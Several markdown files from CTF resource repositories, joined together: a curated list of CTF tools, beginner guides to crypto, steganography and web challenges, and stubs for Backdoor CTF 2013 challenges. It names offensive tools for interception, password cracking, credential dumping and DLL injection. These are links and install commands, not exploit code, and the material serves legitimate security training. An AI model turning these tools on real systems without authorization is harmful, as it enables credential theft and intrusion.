# Contribution Guidelines

- **To add to the list:** Submit a pull request
- **To remove from the list:** Open an issue

- List items should be sorted *alphabetically*.
- Each item should be limited to one link
- The link should be the name of the package or project
- Direct installation commands should follow on the next line, indented by 2 spaces and enclosed in \`\`
- Descriptions should be clear, concise, and non-promotional
- Descriptions should follow the link, on the same line
- Run `npm install` and then `npm test` to verify everything is correct according to guidelines

## Quality standard

To stay on the list, package repositories should adhere to these quality standards:

- Generally useful to the community
- Functional
- Stable


## Reporting issues

Please open an issue if you find anything that could be improved or have suggestions for making the list a more valuable resource. Thanks!
# Awesome CTF [![Build Status](https://travis-ci.org/apsdehal/awesome-ctf.svg?branch=master)](https://travis-ci.org/apsdehal/awesome-ctf) [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)

A curated list of [Capture The Flag](https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security) (CTF) frameworks, libraries, resources, softwares and tutorials. This list aims to help starters as well as seasoned CTF players to find everything related to CTFs at one place.

### Contributing

Please take a quick look at the [contribution guidelines](https://github.com/apsdehal/ctf-tools/blob/master/CONTRIBUTING.md) first.

#### _If you know a tool that isn't present here, feel free to open a pull request._

### Why?

It takes time to build up collection of tools used in ctf and remember them all. This repo helps to keep all these scattered tools at one place.


### Contents

- [Awesome CTF](#awesome-ctf)
  - [Create](#create)
    - [Forensics](#forensics)
    - [Platforms](#platforms)
    - [Steganography](#steganography)
    - [Web](#web)
  - [Solve](#solve)
    - [Attacks](#attacks)
    - [Bruteforcers](#bruteforcers)
    - [Cryptography](#crypto)
    - [Exploits](#exploits)
    - [Forensics](#forensics-1)
    - [Reversing](#reversing)
    - [Services](#services)
    - [Steganography](#stegano)
    - [Web](#web-1)

- [Resources](#resources)
  - [Starter Packs](#starter-packs)
  - [Tutorials](#tutorials)
  - [Wargames](#wargames)
  - [Websites](#websites)
  - [Wikis](#wikis)
  - [Writeups Collections](#writeups-collections)

# Create

*Tools used for creating CTF challenges*

## Forensics

*Tools used for creating Forensics challenges*

- [Registry Dumper](http://www.kahusecurity.com/tools/RegistryDumper_v0.1.zip) - Dump your registry

## Platforms

*Projects that can be used to host a CTF*

- [CTFd](https://github.com/isislab/CTFd) - Platform to host jeopardy style CTFs from ISISLab, NYU Tandon
- [fbctf](https://github.com/facebook/fbctf) - Platform to host Capture the Flag competitions from Facebook
- [Mellivora](https://github.com/Nakiami/mellivora) - A CTF engine written in PHP
- [Scorebot](https://github.com/legitbs/scorebot) - Platform for CTFs by Legitbs (Defcon)

## Steganography

*Tools used to create stego challenges*

Check solve section for steganography.


## Web

*Tools used for creating Web challenges*

*JavaScript Obfustcators*

- [Metasploit JavaScript Obfustcator](https://github.com/rapid7/metasploit-framework/wiki/How-to-obfuscate-JavaScript-in-Metasploit)
- [Uglify](http://marijnhaverbeke.nl//uglifyjs)


# Solve

*Tools used for solving CTF challenges*

## Attacks

*Tools used for performing various kinds of attacks*

- [Bettercap](https://github.com/evilsocket/bettercap) - Framework to perform MITM (Man in the Middle) attacks.
- [Layer 2 attacks](https://github.com/tomac/yersinia) - Attack various protocols on layer 2

## Crypto

*Tools used for solving Crypto challenges*

- [PkCrack](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html) - A tool for Breaking PkZip-encryption
- [RSATool](https://github.com/ius/rsatool) - Generate private key with knowledge of p and q
- [XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher

## Bruteforcers

*Tools used for various kind of bruteforcing (passwords etc.)*

- [John The Jumbo](https://github.com/magnumripper/JohnTheRipper) - Community enhanced version of John the Ripper
- [John The Ripper](http://www.openwall.com/john/) - Password Cracker
- [Ophcrack](http://ophcrack.sourceforge.net/) - Windows password cracker based on rainbow tables.

## Exploits

*Tools used for solving Exploits challenges*

- [binjitsu](https://github.com/binjitsu/binjitsu/) - CTF framework and exploit development library
- [DLLInjector](https://github.com/OpenSecurityResearch/dllinjector) - Inject dlls in processes
- [Metasploit](http://www.metasploit.com/) - Penetration testing software
- [pwntools](https://github.com/Gallopsled/pwntools) - CTF Framework for writing exploits
- [qira](https://github.com/BinaryAnalysisPlatform/qira) - QEMU Interactive Runtime Analyser
- [ROP Gadget](https://github.com/JonathanSalwan/ROPgadget) - Framework for ROP exploitation

## Forensics

*Tools used for solving Forensics challenges*

- [Aircrack-Ng](http://www.aircrack-ng.org/) - Crack 802.11 WEP and WPA-PSK keys
  - `apt-get install aircrack-ng`
- [Audacity](http://sourceforge.net/projects/audacity/) - Analyze sound files (mp3, m4a, whatever)
  - `apt-get install audacity`
- [bkhive and samdump2](http://sourceforge.net/projects/ophcrack/files/samdump2/) - Dump SYSTEM and SAM files
  - `apt-get install samdump2 bkhive`
- [CFF Explorer](http://www.ntcore.com/exsuite.php) - PE Editor
- [creddump](https://github.com/moyix/creddump) - Dump windows credentials
- [DVCS Ripper](https://github.com/kost/dvcs-ripper) - Rips web accessible (distributed) version control systems
- [Exif Tool](http://www.sno.phy.queensu.ca/~phil/exiftool/) - Read, write and edit file metadata
- [extundelete](http://extundelete.sourceforge.net/) - Used for recovering lost data from mountable images
- [Fibratus](https://github.com/rabbitstack/fibratus) - Tool for exploration and tracing of the Windows kernel
- [Foremost](http://foremost.sourceforge.net/) - Extract particular kind of files using headers
  - `apt-get install foremost`
- [fsck.ext4](http://linux.die.net/man/8/fsck.ext3) - Used to fix corrupt filesystems
- [Malzilla](http://malzilla.sourceforge.net/) - Malware hunting tool
- [NetworkMiner](http://www.netresec.com/?page=NetworkMiner) - Network Forensic Analysis Tool
- [PDF Streams Inflater](http://malzilla.sourceforge.net/downloads.html) - Find and extract zlib files compressed in PDF files
- [ResourcesExtract](http://www.nirsoft.net/utils/resources_extract.html) - Extract various filetypes from exes
- [Shellbags](https://github.com/williballenthin/shellbags) - Investigate NT\_USER.dat files
- [UsbForensics](http://www.forensicswiki.org/wiki/USB_History_Viewing) - Contains many tools for usb forensics
- [Volatility](https://github.com/volatilityfoundation/volatility) - To investigate memory dumps
- [Wireshark](https://www.wireshark.org/) - Analyze the network dumps
  - `apt-get install wireshark`

*Registry Viewers*
- [RegistryViewer](http://www.gaijin.at/en/getitpage.php?id=regview) - Used to view windows registries
- [Windows Registry Viewers](http://www.forensicswiki.org/wiki/Windows_Registry) - More registry viewers

## Reversing

*Tools used for solving Reversing challenges*

- [Androguard](https://github.com/androguard/androguard) - Reverse engineer Android applications
- [angr](https://github.com/angr/angr) - platform-agnostic binary analysis framework
- [Apk2Gold](https://github.com/lxdvs/apk2gold) - Yet another Android decompiler
- [ApkTool](http://ibotpeaches.github.io/Apktool/) - Android Decompiler
- [Barf](https://github.com/programa-stic/barf-project) - Binary Analysis and Reverse engineering Framework
- [BinUtils](http://www.gnu.org/software/binutils/binutils.html) - Collection of binary tools
- [BinWalk](https://github.com/devttys0/binwalk) - Analyze, reverse engineer, and extract firmware images.
- [Boomerang](https://github.com/nemerle/boomerang) - Decompile x86 binaries to C
- [GDB](https://www.gnu.org/software/gdb/) - The GNU project debugger
- [Hopper](http://www.hopperapp.com/) - Reverse engineering tool (disassembler) for OSX and Linux
- [IDA Pro](https://www.hex-rays.com/products/ida/) - Most used Reversing software
- [Jadx](https://github.com/skylot/jadx) - Decompile Android files
- [Krakatau](https://github.com/Storyyeller/Krakatau) - Java decompiler and disassembler
- [radare2](https://github.com/radare/radare2) - A portable reversing framework
- [Uncompyle](https://github.com/gstarnberger/uncompyle) - Decompile Python 2.7 binaries (.pyc)
- [WinDbg](http://www.windbg.org/) - Windows debugger distributed by Microsoft
- [z3](https://github.com/Z3Prover/z3) - a theorem prover from Microsoft Research

*JavaScript Deobfustcators*

- [Detox](http://relentless-coding.org/projects/jsdetox/install) - A Javascript malware analysis tool
- [Revelo](http://www.kahusecurity.com/tools/Revelo_v0.6.zip) - Analyze obfuscated Javascript code

*SWF Analyzers*
- [RABCDAsm](https://github.com/CyberShadow/RABCDAsm) - Collection of utilities including an ActionScript 3 assembler/disassembler.
- [swftools](http://www.swftools.org/) - Collection of utilities to work with SWF files
- [xxxswf](https://bitbucket.org/Alexander_Hanel/xxxswf) -  A Python script for analyzing Flash files.

## Services

*Various kind of useful services available around the internet*

- [CSWSH](http://ironwasp.org/cswsh.html) - Cross-Site WebSocket Hijacking Tester
- [Request Bin](http://requestb.in/) - Lets you inspect http requests to a particular url

## Stegano

*Tools used for solving Steganography challenges*

- [Convert](http://www.imagemagick.org/script/convert.php) - Convert images b/w formats and apply filters
- [ImageMagick](http://www.imagemagick.org/script/index.php) - Tool for manipulating images
- [pngtools](http://www.stillhq.com/pngtools/) - For various analysis related to PNGs
  - `apt-get install pngtools`
- [SmartDeblur](https://github.com/Y-Vladimir/SmartDeblur) - Used to deblur and fix defocused images
- [Steganabara](https://www.openhub.net/p/steganabara) -  Tool for stegano analysis written in Java
- [Steghide](http://steghide.sourceforge.net/) - Hide data in various kind of images
- [Stegsolve](http://www.caesum.com/handbook/Stegsolve.jar) - Apply various steganography techniques to images

## Web

*Tools used for solving Web challenges*

- [SQLMap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tooli
- [w3af](https://github.com/andresriancho/w3af) -  Web Application Attack and Audit Framework.
- [XSSer](http://xsser.sourceforge.net/) - Automated XSS testor


# Resources

*Where to discover about CTF*

## Starter Packs

*Collections of installer scripts, useful tools*

- [CTF Tools](https://github.com/zardus/ctf-tools) - Collection of setup scripts to install various security research tools.

## Tutorials

*Tutorials to learn how to play CTFs*

- [CTF Field Guide](https://trailofbits.github.io/ctf/) - Field Guide by Trails of Bits
- [CTF Resources](http://ctfs.github.io/resources/) -  Start Guide maintained by community
- [How to Get Started in CTF](https://www.endgame.com/blog/how-get-started-ctf) - Short guideline for CTF beginners by Endgame
- [MIPT CTF](https://github.com/xairy/mipt-ctf) - A small course for beginners in CTFs (in Russian)

## Wargames

*Always online CTFs*

- [Backdoor](https://backdoor.sdslabs.co/) - Security Platform by SDSLabs.
- [Ctfs.me](http://ctfs.me) - CTF All the time
- [Exploit Exercises](https://exploit-exercises.com/) - Variety of VMs to learn variety of computer security issues.
- [Gracker](http://gracker.org) - Binary challenges having a slow learning curve, and write-ups for each level.
- [Hack This Site](https://www.hackthissite.org/) - Training ground for hackers.
- [IO](http://io.netgarage.org/) - Wargame for binary challenges.
- [Over The Wire](http://overthewire.org/wargames/) - Wargame maintained by OvertheWire Community
- [Pwnable.kr](https://pwnable.kr/) - Pwn Game
- [Ringzer0Team](https://ringzer0team.com/) - Ringzer0 Team Online CTF
- [SmashTheStack](http://smashthestack.org/) - A variety of wargames maintained by the SmashTheStack Community.
- [VulnHub](https://www.vulnhub.com/) - VM-based for practical in digital security, computer application & network administration.
- [WebHacking](http://webhacking.kr) - Hacking challenges for web.
- [WeChall](https://www.wechall.net/) - Always online challenge site.

## Websites

*Various general websites about and on ctf*

- [CTF Time](https://ctftime.org/) - General information on CTF occuring around the worlds
- [Reddit Security CTF](http://www.reddit.com/r/securityctf) - Reddit CTF category

## Wikis

*Various Wikis available for learning about CTFs*

- [Bamboofox](https://bamboofox.torchpad.com/) - Chinese resources to learn CTF
- [ISIS Lab](https://github.com/isislab/Project-Ideas/wiki) - CTF Wiki by Isis lab
- [OpenToAll](http://wiki.opentoallctf.com/) - Open To All Knowledge Base

## Writeups Collections

*Collections of CTF write-ups*

- [Captf](http://captf.com/) - Dumped CTF challenges and materials by psifertex
- [CTF write-ups (community)](https://github.com/ctfs/) - CTF challenges + write-ups archive maintained by the community
- [pwntools writeups](https://github.com/Gallopsled/pwntools-write-ups) - A collection of CTF write-ups all using pwntools
- [Shell Storm](shell-storm.org/repo/CTF/) - CTF challenge archive maintained by Jonathan Salwan
- [Smoke Leet Everyday](https://github.com/smokeleeteveryday/CTF_WRITEUPS) - CTF write-ups repo maintained by SmokeLeetEveryday team.


### LICENSE

MIT :)
#CTF Resources

This repository aims to be an archive of information, tools, and references regarding CTF competitions.

CTFs, especially for beginners, can be very daunting and almost impossible to approach. With some general overviews of common CTF topics and more in-depth research and explanation in specific technologies both beginners and veterans can learn, contribute, and collaborate to expand their knowledge.

##Quick Start

1. First time? [READ THIS!](http://trailofbits.github.io/ctf/) and then the section below. Once you understand the basics, use the resources in the [topics](./topics/) directory to try to solve challenges on websites like [OverTheWire](http://overthewire.org/wargames/) or [CanYouHack.it](http://canyouhack.it/).

2. Beginner? Use the guides found in the [topics](./topics/) directory to try to find out what type of challenges you are presented with and participate in some of the CTFs on [ctftime](https://ctftime.org/).

3. Intermediate? Navigate straight to the topic you are interested in to find extra online resources to help you solve more complex challenges.

4. Master? Help improve this repository! Have a new type of vulnerability you want to explain? Write about it and how to use it!  Have a new tool people can use? add it to the tools directory!

##What are CTFs?

CTFs are computer security/hacking competitions which generally consist of participants breaking, investigating, reverse engineering and doing anything they can to reach the end goal, a "flag" which is usually found as a string of text.

[DEF CON](http://en.wikipedia.org/wiki/DEF_CON) hosts what is the most widely known and first major CTF, occurring annually at the hacking conference in Las Vegas.  Many different competitions have branched off since then, and numerous ones are available year round.  One of the best places to see when CTFs are being scheduled is [CTFTime](https://ctftime.org/), an active website with calendars and team rankings.

###Example

A very simple type of CTF challenge consists of looking at the source code of websites or programs to find flags and/or hints.  For example, can you find the flag hidden on this page?

<!-- flag: 2_l33t_4_M3 -->

###Moving On

You may be able to solve some CTF challenges after looking through the documents in this repository and understanding the basics of the technologies and subjects covered, but you won't be very proficient or successful for long. To be an adept CTF competitor you have to be able to combine many different strategies and tools to find the flag.  Developing the ability to find flags quickly takes practice more than anything, and participating in numerous CTFs will allow you to expand your understanding and abilities, leading you to success. Spend some time on [CTFTime](https://ctftime.org/) working through CTFs to truly improve and learn.

# Bourne-again Shell

Bash is the most common and prolific unix shell, and is now shipped by default on almost all Linux distributions and OSX
# File command

`file` returns the detected type of a file.

# Use

Pass any file as a parameter for `file` to get the filetype

```
$ file file.c
file.c: C program text
```

# More

* `man file`

* [file](https://en.wikipedia.org/wiki/File_command)
# Hex Editor

> With a hex editor, a user can see or edit the raw and exact contents of a file, as opposed to the interpretation of the same content that other, higher level application software may associate with the file format. For example, this could be raw image data, in contrast to the way image editing software would interpret and show the same file. -- [Wikipedia](http://en.wikipedia.org/wiki/Hex_editor)

In CTF challenges hex editors have many use cases like Steganography, Reverse Engineering

*Todo: Basic usage of one of the editors.*

## Linux

Most people seem to prefer the [xxd](http://linuxcommand.org/man_pages/xxd1.html) command as it is fairly simple to use and you don't have to leave your terminal.

In case you are interested in a GUI based application - try [wxHexEditor](http://sourceforge.net/projects/wxhexeditor/). It is cross-platform so you can use the same setup over multiple OSes.

## Windows

There is a port of xxd for Win32 available in this [package](http://www.weihenstephan.de/~syring/win32/UnxUtilsDist.html).

[HxD](http://mh-nexus.de/en/hxd/) is a nice GUI based editor.

## References

[Comparison of Hex Editors](http://en.wikipedia.org/wiki/Comparison_of_hex_editors)
# Tools

CTF tools are essential to the completion of tasks, and are extremely diverse, ranging from code debuggers and dissasemblers to image manipulators.  Tools allow tedious processes to be done quickly and often make challenges much easier to solve.

## Operating Systems

The operating system that you choose to use will not hinder your ability to solve CTF challenges, but can affect your speed and access to tools.  Each of the three major consumer operating systems have their benefits and downsides, and it is up to you to decide which one you wish to use. Many people decide to either dual boot different operating systems or run them in virtual boxes, giving them maximum flexibility.

### Windows

Microsoft Windows is still the most prolific operating system in the world, and the majority of all computers come pre-installed with it.  The fact that it is based off of MS-DOS and does not run the Unix shell like Linux and OSX limits it's command line abilities, but it makes up for it in large, comprehensive software packages.  For example IDA, likely the best dissasembling program, is best used in Windows and is utilized in almost every CTF.  Windows is a good option if you are willing to give up simple command line tools and scripts for large, thorough software packages which are often pricey and/or proprietary.

### Mac

Mac is a very versatile operating system for CTFs, as it can run almost any Linux command-line program while still having nice software packages for general use.  It is typically seen as the cleanest and nicest operating system to work with, but at times has limited software options and tools.  If you have already shelled out money for a mac, you are well prepared and will be able to run the majority of programs necessary on it.

### Linux

Linux is typically seen as the 'hacking' operating system, and it is very often used in such context.  It has the largest base of open source software and tools, and is based off of the versatile bash command line.  If you are comfortable using the command line and want the versatility of quickly writing up scripts and using well-tested tools, Linux is a very good option.

## Getting Started

* Linux/Mac - If you want to get started using Linux or Mac and have not had much experience with them, you want to get acquainted with the command line.  The majority of these operating system's  benefits stem from their command line tools, so once you have a solid basis in Bash you will be able to get started on tasks quickly.

* Windows - As stated before, Windows is based heavily on large software tools, so it would be best to get acquainted with some of its core computer security software like IDA.
# Terminal

A terminal is the window where you can access multiple command-line interfaces, from the typical Bash shell to Python interpreter. Which emulator you choose is not very pertinent to CTFs, but if you are on windows you will have to go out of your way to find one.

## Linux

Luckily, all flavors of Linux and OSX come with a terminal built-in. It is usually found under applications and you can instantly access most command line tools from it.

## Windows

Since Windows is not based off of the same system as Linux and Mac, it has to rely on emulators to run shell commands.  There are quite a few emulators available for Windows, but one that is definitely worth checking out is [Cmder](http://bliker.github.io/cmder/). It is not an emulator per se but a package of useful 3rd party applications.  [GnuWin32](http://gnuwin32.sourceforge.net/) is also a good option to get some of the most common and popular Linux commands on windows.

## References

[List of terminal emulators](http://en.wikipedia.org/wiki/List_of_terminal_emulators)
#Base64 Encoding

Base64 encoding is a way to represent binary data as text.

##Use

* Encode:

    * The [base64](http://linux.die.net/man/1/base64) command line program

* Decode:

    * Online [here](http://www.base64decode.org/)

    * The [base64](http://linux.die.net/man/1/base64) command line program

##More

[Base64](https://en.wikipedia.org/wiki/Base64)

#Caesar Cipher

The Caesar Cipher is a very simple and common encryption method which shifts a string of letters a certain number of positions up or down the alphabet.

##Use

* Create:

    * Online [here](http://tools.zenverse.net/caesar-cipher/)

    * [Python script](http://www.stealthcopter.com/blog/2009/12/python-cryptography-caesar-shift-encryption-shift-cipher/)

* Crack:

    * Online [here](http://tools.zenverse.net/caesar-cipher/)

    * [Bash script](http://www.linux-support.com/cms/chris-lamb-decrypting-the-caesar-cipher-using-shell/)

##More

[Caesar Cipher](https://en.wikipedia.org/wiki/Caesar_cipher)
#MD5 Hashing

MD5 is a hashing function which creates a 16-byte hash value (usually represented as a 32 digit hexadecimal number) from any file.

#Use

* Create a hash:

    * Online [here](http://www.md5-creator.com/)

    * The [md5sum](https://en.wikipedia.org/wiki/Md5sum) command line program

* Crack a hash:

    * Online [here](http://www.md5decrypter.co.uk/)

##More

[MD5](https://en.wikipedia.org/wiki/Md5)
# Cryptography

## Quick Start

* Is the text relatively small? a few sentences?

    * Is the text 32 characters long? Most likely an [md5](./md5/) hash

    * 40 characters long? Most likely a [SHA1](./sha1/) hash

    * Are there equal signs spread out through the text, often next to each other? Probably a [base64](./base64/) encoded string

    * Is the text only letters, without numbers or special characters?

        * Check if it is a [Caesar](./caesar-cipher/), [Vigenere](./vigenere-cipher/), or other type of cipher

    * Rarely, it may be a keyboard map as found in the [Olympic CTF 2014](https://github.com/ctfs/write-ups/tree/master/olympic-ctf-2014/crypting)

* Any hints about keys? signing? most likely [RSA](./rsa/)


##About

> Cryptography is the practice and study of techniques for secure communication in the presence of third parties. - [Wikipedia](http://en.wikipedia.org/wiki/Cryptography)

In the case of CTFs, the goal is usually to crack or clone cryptographic objects or algorithms to reach the flag.

###Example

If you look around the folders in this page you should be able to find a suitable way to solve this simple cipher:

```
Hint: Julius Caesar's favorite cipher

kxn iye lbedec
```

##Sources/See More

[Introduction to Cryptography](http://www.cs.umd.edu/~waa/414-F11/IntroToCrypto.pdf)
#RSA

RSA is a public-key cryptosystem which uses a public-private key pair to encrypt and decrypt information securely.

##Use

* RSA library in [python](https://pypi.python.org/pypi/rsa) with easy to use [docs](http://stuvel.eu/files/python-rsa-doc/usage.html)

* [Thorough explanation](http://www.muppetlabs.com/~breadbox/txt/rsa.html) of RSA with a [simple crack example](http://www.muppetlabs.com/~breadbox/txt/rsa.html#13)

##More

[RSA](https://en.wikipedia.org/wiki/RSA_algorithm)
#SHA1 Hash

SHA1 is a hash function which creates a 20-byte hash value (usually represented by a 40 digit hexadecimal number) from any file.

##Use

* Create a hash:

    * Online [here](http://ratfactor.com/sha1)

    * The [sha1sum](https://en.wikipedia.org/wiki/Sha1sum) command line program

* Crack a hash:

    * Online [here](http://www.stringfunction.com/sha1-decrypter.html)

##More

[SHA1](https://en.wikipedia.org/wiki/Sha1)
#Vigenère Cipher

The Vigenère Cipher is an encrypting method which uses a series of different Caesar ciphers based on the letters of a keyword

##Use

* Create:

    * Online [here](http://sharkysoft.com/vigenere/)

* Crack:

	* Online [here](http://smurfoncrack.com/pygenere/index.php)

##Sources/See More

[Online Vigenère cracker](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx)


# Topics

CTF challenges are usually categorized into one of these broad groups, and although at times they may be labeled, it is usually up to the competitor to find out what type of challenge it is. Here are some broad guidelines to finding out what type of challenge is presented:

* Is the challenge given as a web link? If following the link does not download a file, the challenge is most likely a [web](./web/) one.

* Is the file provided an image or music file? If so, the challenge is most likely a [steganography](./steganography/) one.

* If the file is a jumbled text file, it is most likely a [cryptography](./cryptography/) challenge.

* If the file provided is not readily identifiable, the best tool to use is the [file](../tools/file/README.md) command, which tells you what type of file it is.

    * If the file output is PCAP or relating to packets or the web, the challenge is likely a [web](./web) one.

    * If the file output is an ELF file, it is most likely a [reversing](./reversing/) challenge.

    * If the file output is an executable, it is most likely a [reversing](./reversing/) challenge.

    * Last resort, google the output of the `file` command on the file
#Reversing

##Quick Start

*To-do*

##About

Reversing in the context of CTFs is usually the reverse engineering of software (executables/bin files) into assembly code and at times the original source code to understand what is happening in a program, break a program (e.g. buffer overflows), or to decrypt encryptions done by a program. Challenges related to reversing are usually not as easy to pick up on as others, and require a lot of diligence and learning to truly understand and be able to tackle.

##Getting Started

* [Reverse Engineering for Beginners](https://github.com/dennis714/RE-for-beginners) - an extremely well-written and verbose free book which explains multiple CPU instruction sets and methods for writing and understanding them.
#Hiding a file in an image

One of the most common steganography tricks is to hide a file inside of an image.  The file will open normally as an image but will also hold hidden files inside, commonly zip, text, and even other image files.

The reason this works is because when an image file is read it has starting and ending bytes dictating the size of the image.  The image viewer that you use will use the information between these bytes to present an image to you, ignoring anything after the terminating byte.

For example, The terminating byte for a JPEG is FF D9 in hex, so using a hex viewer ([xxd](http://linuxcommand.org/man_pages/xxd1.html) is good for linux, or something like [HxD](http://mh-nexus.de/en/hxd/) for windows) you can find out where the image finishes.  These bytes are sometimes hard to find in a sea of numbers though, so looking at the dump of the hex (the text representing the hex bytes) can also help you find hidden .txt or .zip files.

###Example

A very simple implementation of this strategy is used in the [example.jpg](example.jpg) file in this directory. If you save it to your computer and open it up with an image viewer, you should be presented with a simple jpg image.

Now lets try to find the flag. Open up the image in your favorite hex editor and start looking around for something odd (You may find the flag itself from the dump at this point, but for the sake of example try extracting it). Near the bottom of the file you should see the terminating byte of a jpg `ffd9`:

`01e17a0: 685c 7fab 8eb4 5b32 61f1 c4ff d950 4b03  h\....[2a....PK.`

Another important part of this line is the `PK` near the end. `PK` are the initials of Phil Katz, the inventor of the zip file, and indicate that a zip file starts at that point.

Using this information we can use another handy linux tool, [`dd`](http://en.wikipedia.org/wiki/Dd_(Unix)). The `dd` command is very versatile and allows for the copying and converting of a multitude of files. In our case, we are going to be using it to extract the zip file.

We know where the location of the zip file is, but `dd` only takes decimal values, so we convert the hexadecimal location 0x01e17ad from hex to decimal to get 1972141.

Pluging this into dd:

`dd if=example.jpg bs=1 skip=1972141 of=foo.zip`

This takes in the image example.jpg, the 'in file' if, reads one block at a time, 'block size' bs,  skips to block 1972141, skip,  and writes it to the 'out file' zip we call foo.zip. When this completes you should have a zip file you can easily unzip to access the text file inside.

This is the long way of solving a simple steganography problem but shows how the strategy works. In the Solving section more concise and efficient methods are described.

##Detecting

These challenges are usually presented as a simple picture with no other instructions, and it is up to the competitor to run it through a hex editor to find out if it involves steganography.  If you are presented with an image and no instructions, your safest bet is that is has something hidden after the closing tags of the image.

##Solving

Although it is possible and at times practical to solve these tasks using linux tools like `dd`, there are some tools that make it much easier. [`Binwalk`](http://binwalk.org/) is an immensely useful tool which automatically detects and extracts files hidden with steganography tools

##CTF Example

Steganography of this type is usually not scored very highly but is decently widespread. BackdoorCTF 2014 created one which is generally straightforward, [ctfexample.jpg](ctfexample.jpg), but involves multiple layers.

##Sources/See More

[XXD](http://linuxcommand.org/man_pages/xxd1.html)

[HxD](http://mh-nexus.de/en/hxd/)

[DD](http://en.wikipedia.org/wiki/Dd_(Unix)

[Binwalk](http://binwalk.org/)
# Hidden Text in Images

Text can be hidden by making it nearly invisible (turning down it's opacity to below 5%) or using certain colors and filters on it.  Although the text is indiscernible to the naked eye, it is still there, and there are a variety of tools which allow the text to be extracted.

## Use

* Create

	* Watermark example [in GIMP](http://www.wikihow.com/Create-Hidden-Watermarks-in-GIMP)

* Find

	* [GIMP](http://www.gimp.org/) or [Photoshop](http://www.photoshop.com/) can be used to uncover the flag by using different filters and color ranges, as shown in the same [watermark guide](http://www.wikihow.com/Create-Hidden-Watermarks-in-GIMP) as above.

	* [Stegsolve](https://www.wechall.net/forum/show/thread/527/Stegsolve_1.3/page-1) is an immensely useful program for many steganography challenges, allowing you to go through dozens of filters to try to uncover hidden text.

	* There are many scripts that have been written to substitute certain colors and make hidden the text legible, for example [this](http://pastebin.com/46VmzrRU) Ruby script highlights colors passed to it in the image.

## More


#Steganography

##Quick Start

* If the file is an image, see [File in an Image](./file-in-image/) or [Hidden Text](./invisible-text/)

##About

Steganography involves concealing a message, image, or file within anotVher message, image, or file.

In the context of CTFs steganography usually involves finding the hints or flags that have been hidden with steganography.  Most commonly a media file will be given as a task with no further instructions, and the participants have to be able to uncover the message that has been encoded in the media.

##More

[Steganography](http://en.wikipedia.org/wiki/Steganography)
#HTTP (Hypertext Transfer Protocol)#PHP

PHP is [a server-side scripting language designed for web development](http://en.wikipedia.org/wiki/PHP).

##More

[PHP](http://en.wikipedia.org/wiki/PHP)
#Web

##Quick Start

* Login field/text input a central part of website? Two major possible options:

    * If a databse is involved, likely a [SQL injection](./sql-injections/)

    * If the input is used in the website, possible [XSS vulnerability](./xss/)


##About

Web challenges in CTF competitions usually involve the use of HTTP (or similar protocols) and technologies involved in information transfer and display over the internet like PHP, CMS's (e.g. Django), SQL, Javascript, and more.  There are many tools used to access and interact with the web tasks, and choosing the right one is a major facet of the challenges. Although web browsers are the most common and well known way of interacting with the internet, tools like `curl` and `nc` allow for extra options and parameters to be passed and utilized.

##More

[Internet Security](https://en.wikipedia.org/wiki/Internet_security)
#SQL Injections

##Use

* Learn:

    * Good [introduction and database](https://www.owasp.org/index.php/SQL_injection) of SQL injections

##More

[SQL Injection](https://en.wikipedia.org/wiki/SQL_injection)
# Cross-site Scripting

Cross-site scripting (XSS) is a typical web vulnerability which allows attackers to inject their own client-side code into the website.

## Use

* Learn:

    * Introduction by [Google](https://www.google.com/about/appsecurity/learning/xss/index.html) to the topic

    * Game by [Google](https://xss-game.appspot.com/) for fun and practice

## More

[Cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)
# Backdoor CTF 2013: Binary 100

**Category:** Binary
**Points:** 100
**Solves:** 
**Description:** 

> Solve it . As simple as that !
> 
> Here is the source code of that binary .
> 
> Flag is the md5 of secret string.
> 
> Download the binary [file](binary100.zip) . For 32bit users - [file](binary100_32bit.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://anee.me/backdoor-ctf-2013-bin-100-writeup/>
# Backdoor CTF 2013: Binary 200

**Category:** Binary
**Points:** 200
**Solves:** 
**Description:** 

> h4x0r, after 10e^46578398239 blinks of the cursor on his windows 98 machine, managed to create something worth selling.
> Now, you would expect him to open source it but then how will he upgrade his Castle? Now you and I don't buy softwares do we? 
> And this "Enter the Registration Key" prompt makes you and I want to tear your hairs apart. 
> Your job is to get that #$&%$##@ key. This should be easy for us but we want you to
> have the fun. 
> 
> You can find the software [here](h4x0r.zip)
> 
> Get cracking!

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Backdoor CTF 2013: Binary 50

**Category:** Binary
**Points:** 50
**Solves:** 
**Description:** 

> One day, after getting tired of being made fun of by all the other hackers, he decided to finally take a look at BASH.
> His first thoughts were "Bash? Bash Windows? Oh those violent script kiddies!". After finishing hundreds of online tutorials, 
> he accidentally (obviously)found a flag. His next status update was " The script kiddies will never be able to get the flag from this password protected binary.
> 
> How dare he call you and us "script kiddies"?! Take him down.
> Here is the [file](binary50.zip) . For 32bit users - [file](binary50.zip_32bit)

## Write-up

(TODO)

## Other write-ups and resources

* <http://anee.me/backdoorctf-2013-bin-50-writeup/>
# Backdoor CTF 2013: Binary 500

**Category:** Binary
**Points:** 500
**Solves:** 
**Description:** 

> h4x0r realized that his software had a vulnerability and has fixed the software now. 
> After using it free for so much time, no one wants to buy it. Just get us the key again. 
> 
> You can find the software [here](h4x0r.zip)
> 
> Get cracking!

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Backdoor CTF 2013: Crypto 250

**Category:** Crypto
**Points:** 250
**Solves:** 
**Description:** 

> While poking around H4x0r's security systems , two text files containing 16*32 array of hexadecimal charecters . Neither adding nor subtracting the files from each other helped .
> H4x0r seems fond of bases lower than decimal . Unless you manage to crack this , he will succeed in his evil plans to rule the world . 
> 
> HINT : H4x0r loves binary representation and of course does the opposite of what everyone else does. So when everyone else uses XOR he...
> If after this you still are stuck, this might help you: for some reason he thinks pigs are related to ciphers!

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Backdoor CTF 2013: Crypto 400

**Category:** Crypto
**Points:** 400
**Solves:** 
**Description:** 

> Now, this is an open challenge. h4x0r has created his own encryption algorithm and has decided to challenge all the hackers in the world. He has made the code public here. 
> 
> 
